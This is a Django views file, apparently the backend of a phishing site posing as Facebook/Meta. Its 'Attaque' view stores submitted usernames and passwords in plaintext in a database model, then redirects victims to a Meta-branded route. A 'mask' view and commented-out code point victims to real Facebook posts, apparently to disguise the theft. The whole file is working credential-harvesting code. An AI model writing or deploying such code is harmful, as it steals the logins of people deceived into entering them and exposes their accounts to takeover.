from django.shortcuts import render, HttpResponse, redirect

# Create your views here

from .models import Muntu

def G(request):
    return render(request,'formulaire.html')
    

def Attaque(request):
    if request.method == 'POST':
        name = request.POST.get('username')
        password = request.POST.get('password')
        
        # Enregistrer les données dans la base de données sans chiffrement

        Muntu.objects.create(nom=name, mot_de_passe=password)
        #faceBook_link = 'https://web.facebook.com/share/p/LaJUY9ZJfa6YEhwL/'
        #return redirect(faceBook_link)
        return redirect('Meta')
    return render(request, 'y.html')

def mask(request):
    facebook_link = "https://web.facebook.com/share/p/qdX2gmuYwxsha77T/"
    context = {
        'facebook_link': facebook_link
    }
    return render(request, 'settings.html', context)